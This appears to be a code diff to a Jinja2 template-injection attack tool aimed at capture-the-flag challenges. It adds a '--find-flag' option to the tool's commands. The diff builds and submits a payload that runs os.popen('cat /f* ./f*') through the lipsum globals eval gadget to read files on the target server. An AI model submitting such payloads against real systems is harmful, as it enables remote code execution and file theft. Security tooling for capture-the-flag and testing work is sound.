@@ -27,6 +27,7 @@ from .const import (
     PythonVersion,
     ReplacedKeywordStrategy,
     DetectWafKeywords,
+    FindFlag,
     FLASK_CONTEXT_VAR,
     ATTRIBUTE,
     ITEM,
@@ -655,7 +656,10 @@ def do_crack_request_pre(
 
 
 def do_crack(
-    full_payload_gen: FullPayloadGen, submitter: Submitter, exec_cmd: Union[str, None]
+    full_payload_gen: FullPayloadGen,
+    submitter: Submitter,
+    exec_cmd: Union[str, None],
+    find_flag: FindFlag,
 ):
     """使用payload生成器攻击对应的表单参数/路径
 
@@ -669,8 +673,24 @@ def do_crack(
         submitter=submitter,
         full_payload_gen_like=full_payload_gen,
     )
-    # TODO: provide an option to disable this
-    if isinstance(submitter, ExtraParamAndDataCustomizable):
+    is_find_flag_enabled = find_flag == FindFlag.ENABLED
+    if find_flag == FindFlag.AUTO:
+        test_string = repr('"generate_me": os.popen("cat /f* ./f*").read(),')
+        payload, will_print = full_payload_gen.generate(EVAL, (STRING, test_string))
+        if payload is None or not will_print:
+            is_find_flag_enabled = False
+        elif len(payload) >= len(test_string) * 1.5 + len(
+            "lipsum.__globals__.__builtins__.eval"
+        ):
+            logger.info(
+                "[yellow]Payload for finding flag "
+                "is too long, we decide not to submit it[/]",
+            )
+            is_find_flag_enabled = False
+        else:
+            is_find_flag_enabled = True
+
+    if isinstance(submitter, ExtraParamAndDataCustomizable) and is_find_flag_enabled:
         logger.info(
             "[yellow]Searching flags...[/]",
         )
@@ -697,6 +717,7 @@ def do_crack_eval_args(
     submitter: Submitter,
     eval_args_payloadgen: EvalArgsModePayloadGen,
     exec_cmd: Union[str, None],
+    find_flag: FindFlag
 ):
     """攻击对应的表单参数/路径，但是使用eval_args方法
 
@@ -710,6 +731,8 @@ def do_crack_eval_args(
         submitter=submitter,
         full_payload_gen_like=eval_args_payloadgen,
     )
+    if find_flag != FindFlag.DISABLED:
+        print(cmd_exec_func("@getflaginfo"))
     if exec_cmd:
         print(cmd_exec_func(exec_cmd))
     else:
@@ -750,6 +773,13 @@ common_options_cli = [
         cls=EnumOption,
         default=DetectWafKeywords.NONE,
         help="是否枚举被waf的关键字，需要额外时间，默认为none, 可选full/fast",
+    ),
+    click.option(
+        "--find-flag",
+        type=FindFlag,
+        cls=EnumOption,
+        default=FindFlag.AUTO,
+        help="是否自动寻找flag，默认只在WAF较好绕过时自动寻找flag",
     ),
     click.option(
         "--waf-keyword",
@@ -841,6 +871,7 @@ def crack(
     replaced_keyword_strategy: ReplacedKeywordStrategy,
     environment: TemplateEnvironment,
     detect_waf_keywords: DetectWafKeywords,
+    find_flag: FindFlag,
     waf_keyword: List[str],
     eval_args_payload: bool,
     user_agent: str,
@@ -889,7 +920,7 @@ def crack(
             logger.warning("Test form failed...", extra={"highlighter": None})
             raise RunFailed()
         full_payload_gen, submitter = result
-        do_crack(full_payload_gen, submitter, exec_cmd)
+        do_crack(full_payload_gen, submitter, exec_cmd, find_flag)
     else:
         # pylance is not happy about using same variable name
         # that's why we use result'2' here.
@@ -910,7 +941,7 @@ def crack(
             logger.warning("Test form failed...", extra={"highlighter": None})
             raise RunFailed()
         submitter, evalargs_payload_gen = result2
-        do_crack_eval_args(submitter, evalargs_payload_gen, exec_cmd)
+        do_crack_eval_args(submitter, evalargs_payload_gen, exec_cmd, find_flag)
 
 
 @main.command()
@@ -924,6 +955,7 @@ def crack_path(
     replaced_keyword_strategy: ReplacedKeywordStrategy,
     environment: TemplateEnvironment,
     detect_waf_keywords: DetectWafKeywords,
+    find_flag: FindFlag,
     waf_keyword: List[str],
     user_agent: str,
     header: tuple,
@@ -964,7 +996,7 @@ def crack_path(
         logger.warning("Test form failed...", extra={"highlighter": None})
         raise RunFailed()
     full_payload_gen, submitter = result
-    do_crack(full_payload_gen, submitter, exec_cmd)
+    do_crack(full_payload_gen, submitter, exec_cmd, find_flag)
 
 
 @main.command()
@@ -984,6 +1016,7 @@ def crack_json(
     replaced_keyword_strategy: ReplacedKeywordStrategy,
     environment: TemplateEnvironment,
     detect_waf_keywords: DetectWafKeywords,
+    find_flag: FindFlag,
     waf_keyword: List[str],
     user_agent: str,
     header: tuple,
@@ -1027,7 +1060,7 @@ def crack_json(
         logger.warning("Test form failed...", extra={"highlighter": None})
         raise RunFailed()
     full_payload_gen, submitter = result
-    do_crack(full_payload_gen, submitter, exec_cmd)
+    do_crack(full_payload_gen, submitter, exec_cmd, find_flag)
 
 
 @main.command()
@@ -1041,6 +1074,7 @@ def scan(
     replaced_keyword_strategy: ReplacedKeywordStrategy,
     environment: TemplateEnvironment,
     detect_waf_keywords: DetectWafKeywords,
+    find_flag: FindFlag,
     waf_keyword: List[str],
     user_agent: str,
     header: tuple,
@@ -1099,7 +1133,7 @@ def scan(
         if not result:
             continue
         full_payload_gen, submitter = result
-        do_crack(full_payload_gen, submitter, exec_cmd)
+        do_crack(full_payload_gen, submitter, exec_cmd, find_flag)
         return
     logger.warning("Scan failed...", extra={"highlighter": None})
     logger.warning(
@@ -1143,6 +1177,7 @@ def crack_request(
     replaced_keyword_strategy: ReplacedKeywordStrategy,
     environment: TemplateEnvironment,
     detect_waf_keywords: DetectWafKeywords,
+    find_flag: FindFlag,
     waf_keyword: List[str],
     retry_times: int,
     interval: float,
@@ -1203,7 +1238,7 @@ def crack_request(
     if not full_payload_gen:
         logger.warning("Crack request failed...", extra={"highlighter": None})
         raise RunFailed()
-    do_crack(full_payload_gen, submitter, exec_cmd)
+    do_crack(full_payload_gen, submitter, exec_cmd, find_flag)
 
 
 @main.command()
